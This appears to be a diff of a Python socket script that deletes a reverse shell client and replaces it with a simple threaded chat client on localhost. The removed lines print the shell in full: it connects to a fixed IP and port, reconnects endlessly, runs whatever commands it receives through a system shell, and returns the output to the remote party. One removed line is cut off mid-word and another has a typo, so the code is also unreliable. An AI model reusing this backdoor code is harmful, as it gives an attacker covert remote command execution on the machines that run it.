@@ -1,77 +1,24 @@
-import os
 import socket
-import subprocess
-import time
+from threading import Thread
 
+PORT = 9999
+GREETING = '>>> '
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect(('localhost', PORT))
 
-
-def socket_create():
-	try:
-		global host
-		global port
-		global s
-		host = '192.168.0.5'
-		port = 9999
-		s = socket.socket()
-	except socket.error as msg:
-		print("Socket creation error: " + str(msg))
-
-
-
-
-def socket_connect():
-	try:
-		global host
-		global port
-		global s
-		s.connect((host, port))
-	except socket_error as msg:
-		print("Socket connection error: " + str(msg))
-		time.sleep(5)
-		socket_connect()
-
-
-
-def receive_commands():
+def print_messages():
 	while True:
-		data = s.recv(20480)
-		if data[:2].decode("utf-8") == 'cd':
-			try:
-				os.chdir(data[3:].decode("utf-8"))
-			except:
-				pass
-		if data[:].decode("utf-8") == 'quit':
-			s.close()
-			break
-		if len(data) > 0:
-			try:
-				cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIP
-				output_bytes = cmd.stdout.read() + cmd.stderr.read()
-				output_str = str(output_bytes, "utf-8")
-				s.send(str.encode(output_str + str(os.getcwd()) + '> '))
-				print(output_str)
-			except:
-				output_str = "Command not recognized" + "\n"
-				s.send(str.encode(output_str + str(os.getcwd()) + '> '))
-				print(output_str)
-	s.close()
+		data = sock.recv(PORT)
+		print('[Message for you]', data.decode('utf8'))
+		print(end=GREETING, flush=True)
 
 
+def put_messages():
+	while True:
+		message = input(GREETING)
+		if len(message):
+			sock.send(message.encode('utf8'))
 
-def main():
-	global s
-	try:
-		socket_create()
-		socket_connect()
-		receive_commands()
-	except:
-		print("Error in main")
-		time.sleep(5)
-	s.close()
-	main()
-
-
-main()
-
-				
+t = Thread(target=print_messages).start()
+put_messages()
 
